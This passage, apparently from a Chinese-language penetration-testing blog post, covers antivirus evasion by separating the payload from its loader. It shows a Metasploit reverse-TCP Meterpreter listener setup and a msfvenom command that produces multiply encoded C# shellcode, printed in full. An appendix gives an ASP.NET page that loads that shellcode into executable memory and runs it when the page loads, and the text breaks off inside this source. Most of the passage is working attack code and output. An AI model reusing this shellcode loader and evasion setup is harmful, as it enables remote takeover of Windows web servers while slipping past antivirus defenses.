class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(server/socks4a) &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp_uuid </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp_uuid</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.1.5 </span><br><span class="line">lhost =&gt; 192.168.1.5</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 53 </span><br><span class="line">lport =&gt; 53</span><br><span class="line">msf exploit(multi/handler) &gt; set stageencoder x86/shikata_ga_nai</span><br><span class="line">stageencoder =&gt; x86/shikata_ga_nai</span><br><span class="line">msf exploit(multi/handler) &gt; set EnableStageEncoding true</span><br><span class="line">EnableStageEncoding =&gt; true</span><br><span class="line">msf exploit(multi/handler) &gt; set exitonsession false</span><br><span class="line">exitonsession =&gt; false</span><br><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options(exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description </span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp_uuid):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line"></span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process,none)</span><br><span class="line">LHOST 192.168.1.5 yes The listen address</span><br><span class="line">LPORT 53 yes The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">-- ----</span><br><span class="line">0 Wildcard Target</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit -j -z</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">![](../do/media/00d58943295e364f2a1f8251672be88e.jpg)</span><br><span class="line"></span><br><span class="line">### payload生成：</span><br><span class="line">```code</span><br><span class="line">root@John:tmp# msfvenom -a x86 -p windows/meterpreter/reverse_tcp_uuid</span><br><span class="line">LHOST=192.168.1.5 LPORT=53 EnableStageEncoding=true</span><br><span class="line">stageencoder=x86/shikata_ga_nai -e x86/shikata_ga_nai -i 5 -f csharp</span><br><span class="line">/usr/share/metasploit-framework/lib/msf/core/opt.rb:55: warning: constant</span><br><span class="line">OpenSSL::SSL::SSLContext::METHODS is deprecated</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 401 (iteration=0) x86/shikata_ga_nai succeeded with size 428 (iteration=1) x86/shikata_ga_nai succeeded with size 455 (iteration=2) x86/shikata_ga_nai succeeded with size 482 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 509 (iteration=4) x86/shikata_ga_nai chosen with final size 509</span><br><span class="line">Payload size: 509 bytes</span><br><span class="line">Final size of csharp file: 2610 bytes</span><br><span class="line">byte[] buf = new byte[509] &#123;</span><br><span class="line">0xd9,0xcc,0xd9,0x74,0x24,0xf4,0x5a,0xb8,0x76,0x1e,0x3d,0x54,0x2b,0xc9,0xb1,</span><br><span class="line">0x79,0x83,0xc2,0x04,0x31,0x42,0x15,0x03,0x42,0x15,0x94,0xeb,0x83,0x64,0x7e,</span><br><span class="line">0x17,0xee,0x5e,0xa8,0xce,0x7a,0x7b,0xa0,0xae,0xab,0x4a,0xf9,0x23,0x2f,0xa3,</span><br><span class="line">0x05,0xf2,0x58,0x2d,0xf6,0x82,0xb7,0xaf,0x3d,0x91,0x7c,0x80,0x6a,0xd8,0xba,</span><br><span class="line">0x3b,0x5a,0xda,0xb6,0xca,0xc8,0xeb,0x0d,0x8c,0x2a,0x94,0xc2,0x85,0x87,0xbc,</span><br><span class="line">0x25,0xd1,0x6e,0x64,0xfe,0xc0,0xf6,0x5e,0x9f,0x15,0x80,0x17,0x8f,0xaa,0xae,</span><br><span class="line">0xff,0x22,0x6b,0x6b,0x46,0x14,0x4c,0x66,0x50,0xcb,0x1f,0x29,0x00,0x27,0x4c,</span><br><span class="line">0x19,0x12,0x09,0x98,0x38,0x3e,0x6c,0xa2,0x22,0x60,0xbf,0x99,0xdb,0xe7,0xc5,</span><br><span class="line">0xa2,0x46,0x18,0xbd,0xc4,0xae,0xd7,0x82,0xe3,0xbd,0xfe,0x40,0x33,0xf6,0xd2,</span><br><span class="line">0x7a,0x6b,0xe1,0x2f,0xf9,0x4b,0x8b,0xc3,0x57,0x26,0xfe,0xfd,0x91,0xf7,0x93,</span><br><span class="line">0x4a,0xe1,0x85,0xeb,0x68,0x16,0x42,0xc9,0x6f,0xac,0xef,0x28,0x05,0x46,0x76,</span><br><span class="line">0x1b,0xa3,0xb9,0xe9,0xbf,0x1a,0x56,0x3e,0xdc,0x4d,0xf3,0x9f,0x1b,0x09,0x55,</span><br><span class="line">0x63,0x07,0xa3,0x59,0xbc,0x57,0xad,0x72,0x53,0x6b,0xff,0x49,0x10,0x47,0x21,</span><br><span class="line">0x81,0xb8,0x0e,0x98,0xec,0x03,0xa3,0x9f,0x90,0xa3,0x15,0xc4,0x7d,0x87,0x5c,</span><br><span class="line">0xcd,0xfe,0x32,0xca,0x11,0xf3,0x14,0x20,0xc8,0x92,0x36,0x88,0xe8,0xa1,0xad,</span><br><span class="line">0xac,0x46,0x19,0x9f,0x04,0x76,0x01,0x41,0x3d,0x3a,0x7d,0x80,0xa2,0x4e,0x24,</span><br><span class="line">0xcb,0x6b,0xe7,0xc9,0xc8,0xa4,0x01,0x17,0xb3,0x3a,0xd9,0x8e,0x9b,0x13,0x7b,</span><br><span class="line">0xbf,0x49,0xf3,0xa9,0x71,0x57,0x49,0x54,0x60,0x32,0xf4,0x4e,0xfa,0x76,0xf8,</span><br><span class="line">0x38,0x7c,0xb7,0x6b,0xac,0xc1,0x27,0x6b,0xae,0x80,0x10,0x85,0x98,0x61,0x42,</span><br><span class="line">0x1e,0x1e,0xb0,0x58,0x6b,0xff,0x92,0x68,0xa5,0x29,0x45,0x99,0x9c,0xa2,0xc0,</span><br><span class="line">0x29,0x53,0xc3,0x4b,0x76,0x72,0x17,0x60,0x3d,0xd8,0x11,0xce,0xc0,0xe6,0x34,</span><br><span class="line">0xa1,0x26,0x65,0x98,0x79,0xf6,0x58,0x92,0x41,0x04,0xa0,0xf0,0x3d,0xf1,0x44,</span><br><span class="line">0xb9,0x63,0x42,0x1a,0xac,0xad,0x67,0x98,0x8f,0x27,0x73,0xdd,0x54,0x61,0x65,</span><br><span class="line">0xd1,0x72,0xc5,0x0f,0x8a,0xd3,0x80,0x6a,0xc3,0xf6,0x44,0x2f,0x1a,0x6a,0xe6,</span><br><span class="line">0xfa,0x6c,0xa5,0x95,0x54,0x47,0x54,0xbf,0x66,0x78,0xfd,0x40,0x10,0x62,0xe8,</span><br><span class="line">0xc0,0x93,0xa8,0x80,0xb9,0x37,0x4c,0x47,0x7b,0x61,0xc1,0x44,0x13,0x17,0x7f,</span><br><span class="line">0xa2,0x73,0xcd,0x76,0x5f,0x2a,0x98,0x92,0x3e,0x09,0xa3,0x60,0xeb,0x41,0x1a,</span><br><span class="line">0xf4,0xcb,0x6f,0x96,0xc6,0x3c,0xf0,0xda,0xc6,0x1c,0x1c,0xb6,0xa0,0x64,0x67,</span><br><span class="line">0x7b,0xdc,0xe2,0x43,0xf1,0xee,0x3b,0x93,0xb9,0x95,0x29,0x01,0x97,0x8c,0x09,</span><br><span class="line">0x72,0xee,0x78,0x1a,0x13,0x60,0xa6,0xac,0x05,0x99,0x6c,0x28,0x81,0x29,0x5d,</span><br><span class="line">0x37,0x89,0x2a,0x3d,0xbf,0x0e,0xc7,0xeb,0x9f,0x44,0x1d,0xb3,0x4d,0x1a,0xbc,</span><br><span class="line">0xe2,0x22,0xb2,0xb3,0xa6,0x43,0x3e,0x46,0xc5,0x0d,0xba,0x87,0xd5,0x6d,0x70,</span><br><span class="line">0xfe,0x87,0x58,0x2c,0x4b,0x8c,0x2d,0x56,0x21,0x4a,0xbf,0x45,0x8c,0xd9,0x9e,</span><br><span class="line">0xa0,0xe4,0x20,0x6b,0x7f,0xfb,0xd0,0x1e,0x88,0x13,0x6e,0x11,0xe9,0xd9 &#125;;</span><br></pre></td></tr></table></figure><p><img src="../do/media/f5006eadab8d227553b661a3f8ad93f5.jpg" alt></p><h3 id="其中分离shellcode。构造如下："><a href="#其中分离shellcode。构造如下：" class="headerlink" title="其中分离shellcode。构造如下："></a>其中分离shellcode。构造如下：</h3><p><img src="../do/media/84bf0debd2184dacca2b28ce81e1b578.jpg" alt></p><p><img src="../do/media/80a54d326b2bd658b02c39242582164a.jpg" alt></p><p><img src="../do/media/403135af97b987379cb1c42d7bd6f4b6.jpg" alt></p><p><strong>上线成功，关于分离免杀的思路不仅仅限制于脚本，pe文件。包括powershell等。这是每一个安全从业者应该考虑的问题。</strong></p><h3 id="附录：Source-code"><a href="#附录：Source-code" class="headerlink" title="附录：Source code"></a>附录：Source code</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"C#"</span> AutoEventWireup=<span class="string">"true"</span> Inherits=<span class="string">"System.Web.UI.Page"</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">"System"</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">"System.Runtime.InteropServices"</span> %&gt;</span><br><span class="line">&lt;script runat=<span class="string">"server"</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">delegate</span> <span class="keyword">int</span> <span class="title">MsfpayloadProc</span>(<span class="params"></span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] buf = codeBytes[<span class="number">509</span>] &#123;</span><br><span class="line"><span class="number">0xd9</span>,<span class="number">0xcc</span>,<span class="number">0xd9</span>,<span class="number">0x74</span>,<span class="number">0x24</span>,<span class="number">0xf4</span>,<span class="number">0x5a</span>,<span class="number">0xb8</span>,<span class="number">0x76</span>,<span class="number">0x1e</span>,<span class="number">0x3d</span>,<span class="number">0x54</span>,<span class="number">0x2b</span>,<span class="number">0xc9</span>,<span class="number">0xb1</span>,</span><br><span class="line"><span class="number">0x79</span>,<span class="number">0x83</span>,<span class="number">0xc2</span>,<span class="number">0x04</span>,<span class="number">0x31</span>,<span class="number">0x42</span>,<span class="number">0x15</span>,<span class="number">0x03</span>,<span class="number">0x42</span>,<span class="number">0x15</span>,<span class="number">0x94</span>,<span class="number">0xeb</span>,<span class="number">0x83</span>,<span class="number">0x64</span>,<span class="number">0x7e</span>,</span><br><span class="line"><span class="number">0x17</span>,<span class="number">0xee</span>,<span class="number">0x5e</span>,<span class="number">0xa8</span>,<span class="number">0xce</span>,<span class="number">0x7a</span>,<span class="number">0x7b</span>,<span class="number">0xa0</span>,<span class="number">0xae</span>,<span class="number">0xab</span>,<span class="number">0x4a</span>,<span class="number">0xf9</span>,<span class="number">0x23</span>,<span class="number">0x2f</span>,<span class="number">0xa3</span>,</span><br><span class="line"><span class="number">0x05</span>,<span class="number">0xf2</span>,<span class="number">0x58</span>,<span class="number">0x2d</span>,<span class="number">0xf6</span>,<span class="number">0x82</span>,<span class="number">0xb7</span>,<span class="number">0xaf</span>,<span class="number">0x3d</span>,<span class="number">0x91</span>,<span class="number">0x7c</span>,<span class="number">0x80</span>,<span class="number">0x6a</span>,<span class="number">0xd8</span>,<span class="number">0xba</span>,</span><br><span class="line"><span class="number">0x3b</span>,<span class="number">0x5a</span>,<span class="number">0xda</span>,<span class="number">0xb6</span>,<span class="number">0xca</span>,<span class="number">0xc8</span>,<span class="number">0xeb</span>,<span class="number">0x0d</span>,<span class="number">0x8c</span>,<span class="number">0x2a</span>,<span class="number">0x94</span>,<span class="number">0xc2</span>,<span class="number">0x85</span>,<span class="number">0x87</span>,<span class="number">0xbc</span>,</span><br><span class="line"><span class="number">0x25</span>,<span class="number">0xd1</span>,<span class="number">0x6e</span>,<span class="number">0x64</span>,<span class="number">0xfe</span>,<span class="number">0xc0</span>,<span class="number">0xf6</span>,<span class="number">0x5e</span>,<span class="number">0x9f</span>,<span class="number">0x15</span>,<span class="number">0x80</span>,<span class="number">0x17</span>,<span class="number">0x8f</span>,<span class="number">0xaa</span>,<span class="number">0xae</span>,</span><br><span class="line"><span class="number">0xff</span>,<span class="number">0x22</span>,<span class="number">0x6b</span>,<span class="number">0x6b</span>,<span class="number">0x46</span>,<span class="number">0x14</span>,<span class="number">0x4c</span>,<span class="number">0x66</span>,<span class="number">0x50</span>,<span class="number">0xcb</span>,<span class="number">0x1f</span>,<span class="number">0x29</span>,<span class="number">0x00</span>,<span class="number">0x27</span>,<span class="number">0x4c</span>,</span><br><span class="line"><span class="number">0x19</span>,<span class="number">0x12</span>,<span class="number">0x09</span>,<span class="number">0x98</span>,<span class="number">0x38</span>,<span class="number">0x3e</span>,<span class="number">0x6c</span>,<span class="number">0xa2</span>,<span class="number">0x22</span>,<span class="number">0x60</span>,<span class="number">0xbf</span>,<span class="number">0x99</span>,<span class="number">0xdb</span>,<span class="number">0xe7</span>,<span class="number">0xc5</span>,</span><br><span class="line"><span class="number">0xa2</span>,<span class="number">0x46</span>,<span class="number">0x18</span>,<span class="number">0xbd</span>,<span class="number">0xc4</span>,<span class="number">0xae</span>,<span class="number">0xd7</span>,<span class="number">0x82</span>,<span class="number">0xe3</span>,<span class="number">0xbd</span>,<span class="number">0xfe</span>,<span class="number">0x40</span>,<span class="number">0x33</span>,<span class="number">0xf6</span>,<span class="number">0xd2</span>,</span><br><span class="line"><span class="number">0x7a</span>,<span class="number">0x6b</span>,<span class="number">0xe1</span>,<span class="number">0x2f</span>,<span class="number">0xf9</span>,<span class="number">0x4b</span>,<span class="number">0x8b</span>,<span class="number">0xc3</span>,<span class="number">0x57</span>,<span class="number">0x26</span>,<span class="number">0xfe</span>,<span class="number">0xfd</span>,<span class="number">0x91</span>,<span class="number">0xf7</span>,<span class="number">0x93</span>,</span><br><span class="line"><span class="number">0x4a</span>,<span class="number">0xe1</span>,<span class="number">0x85</span>,<span class="number">0xeb</span>,<span class="number">0x68</span>,<span class="number">0x16</span>,<span class="number">0x42</span>,<span class="number">0xc9</span>,<span class="number">0x6f</span>,<span class="number">0xac</span>,<span class="number">0xef</span>,<span class="number">0x28</span>,<span class="number">0x05</span>,<span class="number">0x46</span>,<span class="number">0x76</span>,</span><br><span class="line"><span class="number">0x1b</span>,<span class="number">0xa3</span>,<span class="number">0xb9</span>,<span class="number">0xe9</span>,<span class="number">0xbf</span>,<span class="number">0x1a</span>,<span class="number">0x56</span>,<span class="number">0x3e</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0xf3</span>,<span class="number">0x9f</span>,<span class="number">0x1b</span>,<span class="number">0x09</span>,<span class="number">0x55</span>,</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x07</span>,<span class="number">0xa3</span>,<span class="number">0x59</span>,<span class="number">0xbc</span>,<span class="number">0x57</span>,<span class="number">0xad</span>,<span class="number">0x72</span>,<span class="number">0x53</span>,<span class="number">0x6b</span>,<span class="number">0xff</span>,<span class="number">0x49</span>,<span class="number">0x10</span>,<span class="number">0x47</span>,<span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0xb8</span>,<span class="number">0x0e</span>,<span class="number">0x98</span>,<span class="number">0xec</span>,<span class="number">0x03</span>,<span class="number">0xa3</span>,<span class="number">0x9f</span>,<span class="number">0x90</span>,<span class="number">0xa3</span>,<span class="number">0x15</span>,<span class="number">0xc4</span>,<span class="number">0x7d</span>,<span class="number">0x87</span>,<span class="number">0x5c</span>,</span><br><span class="line"><span class="number">0xcd</span>,<span class="number">0xfe</span>,<span class="number">0x32</span>,<span class="number">0xca</span>,<span class="number">0x11</span>,<span class="number">0xf3</span>,<span class="number">0x14</span>,<span class="number">0x20</span>,<span class="number">0xc8</span>,<span class="number">0x92</span>,<span class="number">0x36</span>,<span class="number">0x88</span>,<span class="number">0xe8</span>,<span class="number">0xa1</span>,<span class="number">0xad</span>,</span><br><span class="line"><span class="number">0xac</span>,<span class="number">0x46</span>,<span class="number">0x19</span>,<span class="number">0x9f</span>,<span class="number">0x04</span>,<span class="number">0x76</span>,<span class="number">0x01</span>,<span class="number">0x41</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x7d</span>,<span class="number">0x80</span>,<span class="number">0xa2</span>,<span class="number">0x4e</span>,<span class="number">0x24</span>,</span><br><span class="line"><span class="number">0xcb</span>,<span class="number">0x6b</span>,<span class="number">0xe7</span>,<span class="number">0xc9</span>,<span class="number">0xc8</span>,<span class="number">0xa4</span>,<span class="number">0x01</span>,<span class="number">0x17</span>,<span class="number">0xb3</span>,<span class="number">0x3a</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x9b</span>,<span class="number">0x13</span>,<span class="number">0x7b</span>,</span><br><span class="line"><span class="number">0xbf</span>,<span class="number">0x49</span>,<span class="number">0xf3</span>,<span class="number">0xa9</span>,<span class="number">0x71</span>,<span class="number">0x57</span>,<span class="number">0x49</span>,<span class="number">0x54</span>,<span class="number">0x60</span>,<span class="number">0x32</span>,<span class="number">0xf4</span>,<span class="number">0x4e</span>,<span class="number">0xfa</span>,<span class="number">0x76</span>,<span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0x38</span>,<span class="number">0x7c</span>,<span class="number">0xb7</span>,<span class="number">0x6b</span>,<span class="number">0xac</span>,<span class="number">0xc1</span>,<span class="number">0x27</span>,<span class="number">0x6b</span>,<span class="number">0xae</span>,<span class="number">0x80</span>,<span class="number">0x10</span>,<span class="number">0x85</span>,<span class="number">0x98</span>,<span class="number">0x61</span>,<span class="number">0x42</span>,</span><br><span class="line"><span class="number">0x1e</span>,<span class="number">0x1e</span>,<span class="number">0xb0</span>,<span class="number">0x58</span>,<span class="number">0x6b</span>,<span class="number">0xff</span>,<span class="number">0x92</span>,<span class="number">0x68</span>,<span class="number">0xa5</span>,<span class="number">0x29</span>,<span class="number">0x45</span>,<span class="number">0x99</span>,<span class="number">0x9c</span>,<span class="number">0xa2</span>,<span class="number">0xc0</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x53</span>,<span class="number">0xc3</span>,<span class="number">0x4b</span>,<span class="number">0x76</span>,<span class="number">0x72</span>,<span class="number">0x17</span>,<span class="number">0x60</span>,<span class="number">0x3d</span>,<span class="number">0xd8</span>,<span class="number">0x11</span>,<span class="number">0xce</span>,<span class="number">0xc0</span>,<span class="number">0xe6</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0x26</span>,<span class="number">0x65</span>,<span class="number">0x98</span>,<span class="number">0x79</span>,<span class="number">0xf6</span>,<span class="number">0x58</span>,<span class="number">0x92</span>,<span class="number">0x41</span>,<span class="number">0x04</span>,<span class="number">0xa0</span>,<span class="number">0xf0</span>,<span class="number">0x3d</span>,<span class="number">0xf1</span>,<span class="number">0x44</span>,</span><br><span class="line"><span class="number">0xb9</span>,<span class="number">0x63</span>,<span class="number">0x42</span>,<span class="number">0x1a</span>,<span class="number">0xac</span>,<span class="number">0xad</span>,<span class="number">0x67</span>,<span class="number">0x98</span>,<span class="number">0x8f</span>,<span class="number">0x27</span>,<span class="number">0x73</span>,<span class="number">0xdd</span>,<span class="number">0x54</span>,<span class="number">0x61</span>,<span class="number">0x65</span>,</span><br><span class="line"><span class="number">0xd1</span>,<span class="number">0x72</span>,<span class="number">0xc5</span>,<span class="number">0x0f</span>,<span class="number">0x8a</span>,<span class="number">0xd3</span>,<span class="number">0x80</span>,<span class="number">0x6a</span>,<span class="number">0xc3</span>,<span class="number">0xf6</span>,<span class="number">0x44</span>,<span class="number">0x2f</span>,<span class="number">0x1a</span>,<span class="number">0x6a</span>,<span class="number">0xe6</span>,</span><br><span class="line"><span class="number">0xfa</span>,<span class="number">0x6c</span>,<span class="number">0xa5</span>,<span class="number">0x95</span>,<span class="number">0x54</span>,<span class="number">0x47</span>,<span class="number">0x54</span>,<span class="number">0xbf</span>,<span class="number">0x66</span>,<span class="number">0x78</span>,<span class="number">0xfd</span>,<span class="number">0x40</span>,<span class="number">0x10</span>,<span class="number">0x62</span>,<span class="number">0xe8</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0x93</span>,<span class="number">0xa8</span>,<span class="number">0x80</span>,<span class="number">0xb9</span>,<span class="number">0x37</span>,<span class="number">0x4c</span>,<span class="number">0x47</span>,<span class="number">0x7b</span>,<span class="number">0x61</span>,<span class="number">0xc1</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0x7f</span>,</span><br><span class="line"><span class="number">0xa2</span>,<span class="number">0x73</span>,<span class="number">0xcd</span>,<span class="number">0x76</span>,<span class="number">0x5f</span>,<span class="number">0x2a</span>,<span class="number">0x98</span>,<span class="number">0x92</span>,<span class="number">0x3e</span>,<span class="number">0x09</span>,<span class="number">0xa3</span>,<span class="number">0x60</span>,<span class="number">0xeb</span>,<span class="number">0x41</span>,<span class="number">0x1a</span>,</span><br><span class="line"><span class="number">0xf4</span>,<span class="number">0xcb</span>,<span class="number">0x6f</span>,<span class="number">0x96</span>,<span class="number">0xc6</span>,<span class="number">0x3c</span>,<span class="number">0xf0</span>,<span class="number">0xda</span>,<span class="number">0xc6</span>,<span class="number">0x1c</span>,<span class="number">0x1c</span>,<span class="number">0xb6</span>,<span class="number">0xa0</span>,<span class="number">0x64</span>,<span class="number">0x67</span>,</span><br><span class="line"><span class="number">0x7b</span>,<span class="number">0xdc</span>,<span class="number">0xe2</span>,<span class="number">0x43</span>,<span class="number">0xf1</span>,<span class="number">0xee</span>,<span class="number">0x3b</span>,<span class="number">0x93</span>,<span class="number">0xb9</span>,<span class="number">0x95</span>,<span class="number">0x29</span>,<span class="number">0x01</span>,<span class="number">0x97</span>,<span class="number">0x8c</span>,<span class="number">0x09</span>,</span><br><span class="line"><span class="number">0x72</span>,<span class="number">0xee</span>,<span class="number">0x78</span>,<span class="number">0x1a</span>,<span class="number">0x13</span>,<span class="number">0x60</span>,<span class="number">0xa6</span>,<span class="number">0xac</span>,<span class="number">0x05</span>,<span class="number">0x99</span>,<span class="number">0x6c</span>,<span class="number">0x28</span>,<span class="number">0x81</span>,<span class="number">0x29</span>,<span class="number">0x5d</span>,</span><br><span class="line"><span class="number">0x37</span>,<span class="number">0x89</span>,<span class="number">0x2a</span>,<span class="number">0x3d</span>,<span class="number">0xbf</span>,<span class="number">0x0e</span>,<span class="number">0xc7</span>,<span class="number">0xeb</span>,<span class="number">0x9f</span>,<span class="number">0x44</span>,<span class="number">0x1d</span>,<span class="number">0xb3</span>,<span class="number">0x4d</span>,<span class="number">0x1a</span>,<span class="number">0xbc</span>,</span><br><span class="line"><span class="number">0xe2</span>,<span class="number">0x22</span>,<span class="number">0xb2</span>,<span class="number">0xb3</span>,<span class="number">0xa6</span>,<span class="number">0x43</span>,<span class="number">0x3e</span>,<span class="number">0x46</span>,<span class="number">0xc5</span>,<span class="number">0x0d</span>,<span class="number">0xba</span>,<span class="number">0x87</span>,<span class="number">0xd5</span>,<span class="number">0x6d</span>,<span class="number">0x70</span>,</span><br><span class="line"><span class="number">0xfe</span>,<span class="number">0x87</span>,<span class="number">0x58</span>,<span class="number">0x2c</span>,<span class="number">0x4b</span>,<span class="number">0x8c</span>,<span class="number">0x2d</span>,<span class="number">0x56</span>,<span class="number">0x21</span>,<span class="number">0x4a</span>,<span class="number">0xbf</span>,<span class="number">0x45</span>,<span class="number">0x8c</span>,<span class="number">0xd9</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0xe4</span>,<span class="number">0x20</span>,<span class="number">0x6b</span>,<span class="number">0x7f</span>,<span class="number">0xfb</span>,<span class="number">0xd0</span>,<span class="number">0x1e</span>,<span class="number">0x88</span>,<span class="number">0x13</span>,<span class="number">0x6e</span>,<span class="number">0x11</span>,<span class="number">0xe9</span>,<span class="number">0xd9</span> &#125;;</span><br><span class="line"></span><br><span class="line">IntPtr handle = IntPtr.Zero;</span><br><span class="line">handle = VirtualAlloc(</span><br><span class="line">IntPtr.Zero,</span><br><span class="line">codeBytes.Length,</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">Marshal.Copy(codeBytes, <span class="number">0</span>, handle, codeBytes.Length);</span><br><span class="line">MsfpayloadProc msfpayload</span><br><span class="line">= Marshal.GetDelegateForFunctionPointer(handle, <span class="keyword">typeof</span>(MsfpayloadProc)) <span class="keyword">as</span> MsfpayloadProc;</span><br><span class="line">msfpayload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">VirtualFree(handle, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"Kernel32.dll"</span>, EntryPoint = <span class="meta-string">"VirtualAlloc"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr address, <span class="keyword">int</span> size, ui ntallocType, <span class="keyword">uint</span> protect</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"Kernel32.dll"</span>, EntryPoint = <span class="meta-string">"VirtualFree"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">VirtualFree</span>(<span class="params">IntPtr address, <span class="keyword">int</span> size, <span class="keyword">uint</span> freeType</span>)</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint</span> MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint</span> MEM_RESERVE = <span class="number">0x2000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint</span> PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line"><span 